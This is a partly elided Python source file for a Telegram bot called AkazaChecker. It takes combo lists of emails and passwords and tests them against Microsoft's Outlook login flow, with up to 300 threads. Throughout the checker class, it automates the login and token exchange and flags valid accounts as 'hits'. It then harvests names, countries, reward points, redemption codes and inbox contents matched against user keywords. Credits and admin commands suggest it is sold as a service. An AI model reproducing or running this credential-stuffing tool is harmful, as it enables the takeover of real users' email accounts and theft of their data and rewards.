...
# ============================================================================
# AkazaChecker CLASS (HIT.PY LOGIN FLOW)
# ============================================================================
class AkazaChecker:
    ...
    def get_redemption_codes(self):
        ...
        try:
            ...
            vt_tag = soup.find('input', attrs={'name': '__RequestVerificationToken'})
            vt = vt_tag.get('value', '') if vt_tag else ''
    ...
    def get_profile_data(self, tk, cid):
        try:
            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'Accept': 'application/json'}
    ...
    def scan_inbox(self, email, tk, cid, uk):
        ic = "0"
        try:
            h_count = {"authorization": f"Bearer {tk}", "action": "StartupData", "content-type": "application/json"}
            r_count = self.session.post(f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0", data="", headers=h_count, timeout=12)
    ...
    async def check(self, email, password, uk=[]):
        try:
            ...
            r1 = self.session.get(idp, headers={"X-OneAuth-AppName": "Outlook Lite", "X-CorrelationId": self.uuid}, timeout=15)
            if "MSAccount" not in r1.text: return {"status": "bad"}

            auth = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            r2 = self.session.get(auth, timeout=15)
            up_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            pp_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not up_match or not pp_match: return {"status": "bad"}
            up, pp = up_match.group(1).replace("\\/", "/"), pp_match.group(1)

            data = f"login={email}&loginfmt={email}&passwd={password}&PPFT={pp}&i19=9960"
            r3 = self.session.post(up, data=data, headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": r2.url}, allow_redirects=False, timeout=15)
            if any(x in r3.text.lower() for x in ["password is incorrect", "error", "doesn't exist"]): return {"status": "bad"}
            if any(x in r3.text for x in ["identity/confirm", "Abuse", "Consent"]): return {"status": "2fa"}
            ...
            tk_data = f"client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&grant_type=authorization_code&code={code}&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=tk_data, timeout=15)
            tk = r4.json().get("access_token")
            if not tk: return {"status": "bad"}
            ...
            results = await asyncio.gather(
                ...
                loop.run_in_executor(bot_executor, self.get_profile_data, tk, cid),
                loop.run_in_executor(bot_executor, self.scan_inbox, email, tk, cid, uk)
            )
            return {'status': 'hit', 'email': email, 'password': password, 'pts': results[0], 'codes': results[1], 'name': results[2][0], 'country': results[2][1], 'inbox': results[3][0], 'inbox_count': results[3][1]}
...
async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
    ...
    db.update_settings(uid, is_adding_kw=False)
    i, s = db.get_user_info(uid), db.get_user_settings(uid)
    ...
    if db.is_mod(uid): kbd.append([InlineKeyboardButton("🛠 Admin", callback_data="admin")])
...
async def handle_text(u: Update, c: ContextTypes.DEFAULT_TYPE):
    ...
    if s['is_adding_kw']:
        ...
        db.update_settings(uid, keywords=all_kws)
...
async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
    ...
    msg = await (u.callback_query.message.reply_text("🚀 Starting session...") if u.callback_query else u.message.reply_text("🚀 Starting session..."))
...
async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    ...
    if q.data == "settings": await q.edit_message_text(f"⚙️ <b>Settings</b>\n\nThreads: <code>{db.get_user_settings(uid)['threads']}</code>\nUse /threads [N] to change (1-300).", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
        ...
        db.update_settings(uid, is_adding_kw=True)
    ...
    elif q.data == "admin" and db.is_mod(uid):
...
async def cmd_skw(u: Update, c: ContextTypes.DEFAULT_TYPE): db.update_settings(u.effective_user.id, is_adding_kw=False); await u.message.reply_text("✅ recording stopped.")
async def cmd_ckw(u: Update, c: ContextTypes.DEFAULT_TYPE): db.update_settings(u.effective_user.id, keywords=[]); await u.message.reply_text("✅ All keywords cleared.")

async def admin_cmd_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not db.is_mod(u.effective_user.id): return
    m = u.message.text.split(); cmd = m[0]; args = m[1:]
    if cmd == "!!addcredits" and len(args) == 2: db.add_credits(int(args[0]), int(args[1])); await u.message.reply_text("✅ Done.")
    elif cmd == "!!grant" and len(args) == 1: db.grant_access(int(args[0])); await u.message.reply_text("✅ Done.")
    elif cmd == "!!ban" and len(args) == 1: db.ban(int(args[0])); await u.message.reply_text("✅ Done.")
    elif cmd == "!!broadcast" and args:
        txt = " ".join(args)
        for t in db.get_all_user_ids():
